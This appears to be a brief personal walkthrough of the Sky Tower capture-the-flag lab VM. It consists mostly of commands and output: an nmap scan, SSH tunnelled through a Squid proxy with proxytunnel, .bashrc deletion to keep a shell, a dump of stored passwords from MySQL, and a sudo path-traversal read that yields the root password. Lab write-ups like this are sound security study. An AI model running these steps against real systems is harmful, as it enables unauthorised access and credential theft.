--------------------------------
# Author Shubham Ranpise
--------------------------------

# 17/december/2022

# Sky Tower

----------------------------------------------------------------
# nmap scan (website hosted on port 80)
----------------------------------------------------------------
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
3128/tcp open     http-proxy Squid http proxy 3.1.20


john
hereisjohn 

proxytunnel -p 10.0.2.13:3128 -d 127.0.0.1:22 -a 4444
ssh john@127.0.0.1 -p 4444
ssh john@127.0.0.1 -p 4444 rm .bashrc

-> cat /var/www/login.php
root:root
-> mysql -uroot -proot
-> show databases;
-> use SkyTech
-> show tables;
-> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
-> ssh sara@127.0.0.1 -p 4444 rm .bashrc
-> ssh sara@127.0.0.1 -p 4444 
-> sudo -l
(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*

-> sudo /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower

-> su root
you got root
